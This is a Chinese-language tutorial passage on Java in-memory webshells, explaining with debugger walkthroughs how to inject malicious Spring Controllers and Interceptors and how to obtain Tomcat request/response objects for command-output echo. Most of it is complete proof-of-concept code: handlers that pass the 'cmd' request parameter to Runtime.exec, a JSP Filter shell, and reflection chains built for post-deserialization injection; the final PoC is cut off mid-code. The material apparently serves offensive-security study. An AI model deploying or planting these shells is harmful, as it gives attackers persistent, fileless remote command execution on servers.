完整POCpackage Test1;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import java.io.IOException;import java.lang.reflect.Method;@Controllerpublic class Controller_Controller &#123;    @RequestMapping(&quot;/control1&quot;)    public String Inject() throws Exception &#123;        //获取当前上下文环境        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);        //手动注册Controller        // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);        // 2. 通过反射获得自定义 controller 中唯一的 Method 对象        Method method = Controller_Shell.class.getDeclaredMethod(&quot;shell&quot;);        // 3. 定义访问 controller 的 URL 地址        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);        // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();        // 5. 在内存中动态注册 controller        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);        r.registerMapping(info, new Controller_Shell(), method);        return &quot;forward:/index.html&quot;;    &#125;    public class Controller_Shell&#123;        public Controller_Shell()&#123;&#125;        public void shell() throws IOException &#123;            //获取request            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();            Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));        &#125;    &#125;&#125;

首先访问/control1路由，由于Controller默认会将结果交给View处理，返回值通常会被解析成一个页面路径，所以这里会报404错误
然后访问我们定义恶意Controller的路由/shell，并进行get传参
Interceptor型内存马基础demo先给出我调整后的目录结构，这样项目结构就非常清晰：


SpringMVCApplication这一启动类必须要放到包下。
Controller包下是Controller内存马的相关类
Interceptor包下是Interceptor内存马的相关类
WebConfig作为配置类，本项目主要用来注册Interceptor

修改后的BasicController如下（模拟正常的Spring服务还是调用该控制器）
package SpringMVC.Controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;@Controllerpublic class BasicController &#123;    // 重构控制器方法，返回值不能为静态目录下的资源，否则无法调用Interceptor    @RequestMapping(&quot;/hello&quot;)    @ResponseBody    public String hello() &#123;        return &quot;Hello&quot;;    &#125;    @RequestMapping(&quot;/login&quot;)    @ResponseBody    public String login() &#123;        return &quot;Login&quot;;    &#125;&#125;

不要设置方法的返回值是静态文件，不然后面将无法触发Interceptor。
概述Spring MVC里的Interceptor与Tomcat里的Filter类似，都是拦截用户请求并做一些处理。既然功能相似，Spring Boot又内置了Tomcat，那么二者会不会有冲突之处呢？并不会，该问题下面会解答。
那么如何构造一个简单的Interceptor呢？在Spring MVC中定义一个Interceptor，主要有以下 2 种方式：

通过实现HandlerInterceptor接口或继承HandlerInterceptor接口的实现类（例如 HandlerInterceptorAdapter）来定义
通过实现WebRequestIntercepto接口或继承WebRequestInterceptor接口的实现类来定义


当然，第一种方法的HandlerInterceptorAdapter在Spring Framework 5.3&#x2F;Spring Boot 2.4被弃用了。

本文通过实现HandlerInterceptor接口构造Interceptor，先看看HandlerInterceptor接口有几个方法：


preHandle：该方法在控制器的处理请求方法前执行，其返回值表示是否中断后续操作，返回true表示继续向下执行，返回 false 表示中断后续操作。
postHandle：该方法在控制器的处理请求方法调用之后、解析视图之前执行，可以通过此方法对请求域中的模型和视图做进一步的修改。
afterCompletion：该方法在控制器的处理请求方法执行完成后执行，即视图渲染结束后执行，可以通过此方法实现一些资源清理、记录日志信息等工作。

所以一个简单的Interceptor如下所示：
package org.example.springweb.Interceptor;import org.springframework.web.servlet.HandlerInterceptor;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class BasicInterceptor implements HandlerInterceptor &#123;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        String url = request.getRequestURI();        if (url.contains(&quot;/hello&quot;)) &#123;            return true; // 放行        &#125;        response.setContentType(&quot;text/plain;charset=UTF-8&quot;);        response.getWriter().write(&quot;This isn&#x27;t hello&quot;);        return false; // 拦截    &#125;&#125;

接下里我们需要将其注册到配置中，使我们访问服务的时候可以经过它：
package org.example.springweb;import org.example.springweb.Interceptor.BasicInterceptor;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class WebConfig implements WebMvcConfigurer &#123;    @Override    public void addInterceptors(InterceptorRegistry registry) &#123;        //设置成访问所有路径都经过BasicInterceptor        registry.addInterceptor(new BasicInterceptor())                .addPathPatterns(&quot;/**&quot;);    &#125;

然后我们运行，并且访问不包含/hello的路由

request调用流程前面提出了一个问题：Spring MVC里的Interceptor与Tomcat里的Filter是否会有冲突？
事实上，当一个Request发送到Spring应用时，大致会经过如下几个层面才会进入Controller层：
HttpRequest --&gt; Filter --&gt; DispactherServlet --&gt; Interceptor --&gt; Controller

请求首先进入Filter，然后由DispatcherServlet进行调度。在DispatcherServlet内部，会经过注册的HandlerInterceptor，然后才会进入具体的Controller方法
接下来我们进行调试，看当一个Request发送到Spring应用的时候，是如何一步步走到Controller的
在ApplicationFilterChain#internalDoFilter处下一个断点，可以看到此时的调用栈是和启动Tomcat时相同的

在internalDoFilter方法的最后，也就是走完了所有的Filter，会调用HttpServlet#service方法。
HttpServlet#service方法最后会调用到DispatcherServlet#doDispatch方法，调用栈如下：

跟进doDispatch方法

继续跟进getHandler方法
该方法会通过遍历this.handlerMappings来获取HandlerMapping类实例mapping

跟进mapping.getHandler方法，先调用getHandlerInternal方法获得handler，然后调用getHandlerExecutionChain方法返回HandlerExecutionChain类的实例：

该方法通过adaptedInterceptors（类型：List）获取所有Interceptor后进行遍历：

this.adaptedInterceptors中可以看见一个我们自己定义的Interceptor，剩下两个便是系统固定的


然后通过chain.addInterceptor方法将所有Interceptor添加到HandlerExecutionChain中。最后返回到DispatcherServlet#doDispatch()，调用mappedHandler.applyPreHandle方法：

跟进后就到我们自定义的Interceptor的preHandle方法了
最后，又回到ApplicationFilterChain#internalDoFilter方法，回到Tomcat的流程
攻击思路通过以上分析，Interceptor实际上是可以拦截所有想到达Controller的请求的。下面的问题就是如何动态地注册一个恶意的Interceptor了。学了很多类型的内存马，我们不难想出思路：

获取当前运行环境的上下文
实现恶意Interceptor
注入恶意Interceptor

获取环境上下文在Controller型内存马中，给出了四种获取Spring上下文ApplicationContext的方法。下面我们还可以通过反射获取LiveBeansView类的applicationContexts属性来获取上下文。
// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性java.lang.reflect.Field filed = Class.forName(&quot;org.springframework.context.support.LiveBeansView&quot;).getDeclaredField(&quot;applicationContexts&quot;);// 2. 属性被 private 修饰，所以 setAccessible truefiled.setAccessible(true);// 3. 获取一个 ApplicationContext 实例WebApplicationContext context =(WebApplicationContext) ((LinkedHashSet)filed.get(null)).iterator().next();

org.springframework.context.support.LiveBeansView类在spring-context 3.2.x版本才加入其中，所以比较低版本的 spring 无法通过此方法获得ApplicationContext的实例。
事实上，我们需要把恶意Interceptot给add到adaptedInterceptors里，所以需要先获得adaptedInterceptors：
AbstractHandlerMapping abstractHandlerMapping = (AbstractHandlerMapping)context.getBean(&quot;requestMappingHandlerMapping&quot;);Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);field.setAccessible(true);ArrayList&lt;Object&gt; adaptedInterceptors = (ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);

实现恶意Interceptorpublic class Shell_Interceptor implements HandlerInterceptor &#123;    @Override    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;        String cmd = request.getParameter(&quot;cmd&quot;);        if (cmd != null) &#123;            try &#123;                Runtime.getRuntime().exec(cmd);            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125; catch (NullPointerException n) &#123;                n.printStackTrace();            &#125;            return true;        &#125;        return false;    &#125;&#125;

注入恶意Interceptor把恶意Interceptot给add到adaptedInterceptors里：
//将恶意Interceptor添加入adaptedInterceptorsShell_Interceptor shell_interceptor = new Shell_Interceptor();adaptedInterceptors.add(shell_interceptor);

完整POC：package org.example.springweb.Interceptor;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import org.springframework.web.servlet.support.RequestContextUtils;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;@Controllerpublic class Interceptor_Controller &#123;    @ResponseBody    @RequestMapping(&quot;/control2&quot;)    public void Inject() throws Exception &#123;        //获取上下文环境        WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());        //获取adaptedInterceptors属性值        org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping)context.getBean(RequestMappingHandlerMapping.class);        java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);        field.setAccessible(true);        java.util.ArrayList&lt;Object&gt; adaptedInterceptors = (java.util.ArrayList&lt;Object&gt;)field.get(abstractHandlerMapping);        //将恶意Interceptor添加入adaptedInterceptors        Shell_Interceptor shell_interceptor = new Shell_Interceptor();        adaptedInterceptors.add(shell_interceptor);    &#125;    public class Shell_Interceptor implements HandlerInterceptor &#123;        @Override        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;            String cmd = request.getParameter(&quot;cmd&quot;);            if (cmd != null) &#123;                try &#123;                    Runtime.getRuntime().exec(cmd);                &#125; catch (IOException e) &#123;                    e.printStackTrace();                &#125; catch (NullPointerException n) &#123;                    n.printStackTrace();                &#125;                return true;            &#125;            return false;        &#125;    &#125;&#125;

先访问/control2路由，之后成功执行命令

内存马回显技术所谓回显，其实就是获取命令执行的结果，这种技术常用于目标机器不出网，无法反弹shell的情况。对于Java的中间件来讲，其关键就是获取request和response对象
回显示例这里我们以上文提到的Tomcat Filter内存马为例，获取对应的回显，关键代码如下
&lt;%! public class Shell_Filter implements Filter &#123;    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;        String cmd = request.getParameter(&quot;cmd&quot;);        response.setContentType(&quot;text/html; charset=UTF-8&quot;);        PrintWriter writer = response.getWriter();        if (cmd != null) &#123;            try &#123;                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();                 //将命令执行结果写入扫描器并读取所有输入                Scanner scanner = new Scanner(in).useDelimiter(&quot;\\A&quot;);                String result = scanner.hasNext()?scanner.next():&quot;&quot;;                scanner.close();                writer.write(result);                writer.flush();                writer.close();            &#125; catch (IOException e) &#123;                e.printStackTrace();            &#125; catch (NullPointerException n) &#123;                n.printStackTrace();            &#125;        &#125;        chain.doFilter(request, response);    &#125;&#125;%&gt;


上述方式我们是通过JSP文件来注入内存马的。由于JSP中内置了一些关键对象，所以我们能够很容易地获得Request和Response对象，并能通过他们来获取目标JVM的上下文Context。那如果我们要通过反序列化漏洞来注入内存马，又如何获取到目标JVM的request和response对象呢？
ThreadLocal Response回显思路来自于@kingkk师傅
首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象，而不是一个全局变量。这样才能获取到当前线程的相关信息。最终我们能够在org.apache.catalina.core.ApplicationFilterChain类中找到这样两个变量*lastServicedRequest和lastServicedResponse*。并且这两个属性还是静态的，我们获取时无需实例化对象

在ApplicationFilterChain#internalDoFilter中，Tomcat会将request对象和response对象存储到这两个变量中

虽然此时的ApplicationDispatcher.*WRAP_SAME_OBJECT*为false，但是我们后续可以通过反射修改，正常为其赋值的代码如下：

可以总结思路如下

反射修改ApplicationDispatcher.WRAP_SAME_OBJECT的值，通过ThreadLocal#set方法将request和response对象存储到变量中
初始化lastServicedRequest和lastServicedResponse两个变量，默认为null
通过ThreadLocal#get方法将request和response对象从*lastServicedRequest和lastServicedResponse*中取出

反射存储request和response//反射获取所需属性Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;); //使用modifiersField反射修改final型变量java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);modifiersField.setAccessible(true);modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);WRAP_SAME_OBJECT_FIELD.setAccessible(true);lastServicedRequestField.setAccessible(true);lastServicedResponseField.setAccessible(true);//将变量WRAP_SAME_OBJECT_FIELD设置为trueif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null))&#123;    WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);&#125;

初始化变量由于变量在Tomcat初始化运行的时候会被设置为null，因此我们还需要初始化lastServicedRequest和lastServicedResponse变量为ThreadLocal类
if (lastServicedRequestField.get(null)==null)&#123;    lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());&#125; if (lastServicedResponseField.get(null)==null)&#123;    lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());&#125;

获取request变量if(lastServicedRequestField.get(null)!=null)&#123;    ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);    ServletRequest servletRequest = (ServletRequest) threadLocal.get();    System.out.println(servletRequest);    System.out.println((HttpServletRequest) servletRequest == req);&#125;

下面我们通过一个简单的demo看看效果，编写一个简单的Servlet
import org.apache.catalina.core.ApplicationFilterChain; import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Modifier; @WebServlet(&quot;/echo&quot;)public class Tomcat_Echo extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;         try &#123;             //反射获取所需属性            Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);             //使用modifiersField反射修改final型变量            java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);            modifiersField.setAccessible(true);            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);            WRAP_SAME_OBJECT_FIELD.setAccessible(true);            lastServicedRequestField.setAccessible(true);            lastServicedResponseField.setAccessible(true);             //将变量WRAP_SAME_OBJECT_FIELD设置为true，并初始化lastServicedRequest和lastServicedResponse变量            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null))&#123;                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);            &#125;             if (lastServicedRequestField.get(null)==null)&#123;                lastServicedRequestField.set(null, new ThreadLocal&lt;&gt;());            &#125;             if (lastServicedResponseField.get(null)==null)&#123;                lastServicedResponseField.set(null, new ThreadLocal&lt;&gt;());            &#125;             //获取request变量            if(lastServicedRequestField.get(null)!=null)&#123;                ThreadLocal threadLocal = (ThreadLocal) lastServicedRequestField.get(null);                ServletRequest servletRequest = (ServletRequest) threadLocal.get();                System.out.println(servletRequest);                System.out.println((HttpServletRequest) servletRequest == req);            &#125;         &#125; catch (NoSuchFieldException e) &#123;            e.printStackTrace();        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125; catch (IllegalAccessException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;

下断点进行调试，第一次请求/echo，由于IS_SECURITY_ENABLED的默认值是false，所以执行到service()方法

service()中调用doGet()，就调用到了poc中的doGet()方法中，对上边提到的三个变量进行了赋值：

之后WRAP_SAME_OBJECT变为true，进入了if，将lastServicedRequest和lastServicedResponse设为object类型的null
第二次访问&#x2F;echo的时候随便get传参一下

由于第一次已经将WRAP_SAME_OBJECT赋值，所以这次顺利进去if从句中并进行赋值

接着走到我们自己写的doGet方法中，可以发现获取到的正是当前Servlet线程中存储的request

在日志里打印了出来

局限性如果漏洞在ApplicationFilterChain获取回显Response代码之前，那么就无法获取到Tomcat Response进行回显。如Shiro RememberMe反序列化漏洞，因为Shiro的RememberMe功能实际上就是一个自定义的Filter。我们知道在ApplicationFilterChain#internalDoFilter方法中，doFilter方法实际上是在我们获取response之前的。因此在Shiro漏洞环境下我们无法通过这种方式获得回显。
private void internalDoFilter(ServletRequest request,                                  ServletResponse response)        throws IOException, ServletException &#123;         // Call the next filter if there is one        if (pos &lt; n) &#123;            ApplicationFilterConfig filterConfig = filters[pos++];            try &#123;...                &#125; else &#123;                     //Shiro漏洞触发点                    filter.doFilter(request, response, this);                &#125;...         // We fell off the end of the chain -- call the servlet instance        try &#123;             //response回显触发点            if (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;                lastServicedRequest.set(request);                lastServicedResponse.set(response);            &#125;...            &#125; else &#123;                servlet.service(request, response);            &#125;        &#125;...    &#125;

通过全局存储Response回显思路来自于@Litch1师傅
Servlet容器是Java Web的核心，因此很多框架对于该容器都进行了一定程度的封装。不同框架、同一框架的不同版本的实现都有可能不同，因此我们很难找到一种通用的获取回显的方法。
比如我们上文通过ThreadLocal类来获取回显的方式就无法适用于Shiro框架下，那么我们能不能换一种思路，寻找Tomcat中全局存储的Request和Response呢？
但我们知道想要获取回显，request和response对象必须是属于当前线程的，因此通过全局存储获取回显的关键就在于找到当前代码运行的上下文和Tomcat运行上下文的联系
寻找全局Response首先我们先来寻找一下Tomcat中的一些全局Response。在AbstractProcessor类中，我们能够找到全局response

调用栈分析我们来分析一下Tomcat的调用栈
doGet:25, Tomcat_Echoservice:655, HttpServlet (javax.servlet.http)service:764, HttpServlet (javax.servlet.http)internalDoFilter:227, ApplicationFilterChain (org.apache.catalina.core)doFilter:162, ApplicationFilterChain (org.apache.catalina.core)...service:357, CoyoteAdapter (org.apache.catalina.connector)service:382, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:895, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1722, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang)

调用了Http11Processor#service方法

而Http11Processor继承了AbstractProcessor类，这里的response对象正是AbstractProcessor类中的属性，因此我们如果能获取到Http11Processor类，就能获取到response对象
那么下面我们就找一找那里能够获取到processor。在AbstractProtocol的内部类ConnectionHandler#register方法中，将processor的信息存储在了属性global中
protected void register(Processor processor) &#123;            if (this.getProtocol().getDomain() != null) &#123;                synchronized(this) &#123;                    try &#123;...                        RequestInfo rp = processor.getRequest().getRequestProcessor();                        rp.setGlobalProcessor(this.global);                       ...&#125;


该属性中存储了一个RequestInfo的List，其中在RequestInfo中我们也能获取Request



我们接着往下看，调用栈调用了内部类ConnectoinHandler的process()方法，该方法会调用register方法将processor存储在global中

至此我们的调用链如下
AbstractProtocol$ConnectoinHandler#process()-------&gt;this.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response

现在我们的工作就是获取AbstractProtocol类或者继承AbstractProtocol的类，从最开始的Http11Processor#service方法中知道还必须实现Adapter接口，继续看调用链。在CoyoteAdapter类中，存在一个connector属性

看Connector类的定义，存在和AbstractProtocol相关的protocolHandler属性
看调用链，该属性的值为一个Http11NioProtocol对象，并且该类继承了AbstractProtocol类

此时我们的调用链变成如下
Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;this.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response

下面就是获取Connector了，Tomcat在启动时会通过StandardService创建Connector

StandardService#addConnector如下，该方法会将Connector放入属性connectors中
public void addConnector(Connector connector) &#123;    Lock writeLock = connectorsLock.writeLock();    writeLock.lock();    try &#123;        connector.setService(this);        Connector results[] = new Connector[connectors.length + 1];        System.arraycopy(connectors, 0, results, 0, connectors.length);        results[connectors.length] = connector;        connectors = results;    &#125; finally &#123;        writeLock.unlock();    &#125;    try &#123;        if (getState().isAvailable()) &#123;            connector.start();        &#125;    &#125; catch (LifecycleException e) &#123;        throw new IllegalArgumentException(sm.getString(&quot;standardService.connector.startFailed&quot;, connector), e);    &#125;    // Report this property change to interested listeners    support.firePropertyChange(&quot;connector&quot;, null, connector);&#125;

最终我们的调用链如下
StandardService-----&gt;Connector-----&gt;Http11NioProtocol-----&gt;AbstractProtocol$ConnectoinHandler#process()-------&gt;this.global--------&gt;RequestInfo-------&gt;Request--------&gt;Response

下面的工作就是获取StandardService对象了，在此之前我们先了解一下Tomcat的类加载机制
Tomcat的类加载机制众所周知，Tomcat使用的并不是传统的类加载机制，我们来看下面的例子
我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。
Tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是WebappClassLoader。
那么我们又如何将原有的父加载器和WebappClassLoader联系起来呢？这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。
Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器。如果没有通过setContextClassLoader(ClassLoader cl)方法设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。
因此WebappClassLoaderBase就是我们寻找的Thread和Tomcat 运行上下文的联系之一。
这里通过调试，我们能够看到这里的线程类加载器是继承了WebAppClassLoader的ParallelWebAppClassLoader。

其中我们同样能获取到StandardService

构造Payload按照上文对调用栈分析的思路，我们可以依次构造出如下Payload
获取StandardContextorg.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

获取ApplicationContextStandardContext中没有直接的方法获取context，因此我们需要通过反射获取

Field context = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);context.setAccessible(true);org.apache.catalina.core.ApplicationContext ApplicationContext = (org.apache.catalina.core.ApplicationContext)context.get(standardContext);

获取StandardService同样使用反射获取
//获取StandardServiceField standardServiceField = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;service&quot;);standardServiceField.setAccessible(true);StandardService standardService = (StandardService) standardServiceField.get(applicationContext);

获取Connector//获取ConnectorField connectorsField = Class.forName(&quot;org.apache.catalina.connector.Connector&quot;).getDeclaredField(&quot;connectors&quot;);connectorsField.setAccessible(true);Connector[] connectors = (Connector[]) connectorsField.get(standardService);Connector connector = connectors[0];

获取Handler我们可以通过Connector#getProtocolHandler方法来获取对应的protocolHandler

这里获取的protocolHandler是Http11NioProtocol对象，前面我们分析过了该类继承了AbstractProtocol类，下面我们再通过反射获取Handler——内部类ConnectionHandler
//获取HandlerProtocolHandler protocolHandler = connector.getProtocolHandler();Field handlerField = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);handlerField.setAccessible(true);org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);

获取内部类ConnectionHandler的global属性//获取内部类AbstractProtocol$ConnectionHandler的global属性Field globalHandler = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);globalHandler.setAccessible(true);RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);

获取processorsglobal属性RequestGroupInfo类中的processors数组用来存储RequestInfo对象，下面我们来获取RequestInfo对象，进而获取request对象
//获取processorsField processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);processorsField.setAccessible(true);List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);

最后我们获取request和response对象
获取request和response这里我选择进一步获取org.apache.catalina.connector.Request对象，因为它继承自HttpServletRequest，我们可以通过PrintWriter类直接获取回显

//获取request和responseField requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);requestField.setAccessible(true);for (RequestInfo requestInfo : requestInfoList)&#123;     //获取org.apache.coyote.Request    org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);     //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request    org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);    org.apache.catalina.connector.Response http_response = http_request.getResponse();     PrintWriter writer = http_response.getWriter();    String cmd = http_request.getParameter(&quot;cmd&quot;);     InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();    Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;);    String result = scanner.hasNext()?scanner.next():&quot;&quot;;    scanner.close();    writer.write(result);    writer.flush();    writer.close();&#125;

完整pocimport org.apache.catalina.connector.Connector;import org.apache.catalina.core.ApplicationContext;import org.apache.catalina.core.StandardContext;import org.apache.catalina.core.StandardService;import org.apache.coyote.ProtocolHandler;import org.apache.coyote.RequestGroupInfo;import org.apache.coyote.RequestInfo;import org.apache.tomcat.util.net.AbstractEndpoint; import javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.InputStream;import java.io.PrintWriter;import java.lang.reflect.Field;import java.util.List;import java.util.Scanner; @WebServlet(&quot;/response&quot;)public class Tomcat_Echo_Response extends HttpServlet &#123;    @Override    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;         //获取StandardService        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();         System.out.println(standardContext);         try &#123;            //获取ApplicationContext            Field applicationContextField = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);            applicationContextField.setAccessible(true);            ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(standardContext);             //获取StandardService            Field standardServiceField = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredField(&quot;service&quot;);            standardServiceField.setAccessible(true);            StandardService standardService = (StandardService) standardServiceField.get(applicationContext);             //获取Connector            Field connectorsField = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;connectors&quot;);            connectorsField.setAccessible(true);            Connector[] connectors = (Connector[]) connectorsField.get(standardService);            Connector connector = connectors[0];             //获取Handler            ProtocolHandler protocolHandler = connector.getProtocolHandler();            Field handlerField = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);            handlerField.setAccessible(true);            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) handlerField.get(protocolHandler);             //获取内部类AbstractProtocol$ConnectionHandler的global属性            Field globalHandler = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);            globalHandler.setAccessible(true);            RequestGroupInfo global = (RequestGroupInfo) globalHandler.get(handler);             //获取processors            Field processorsField = 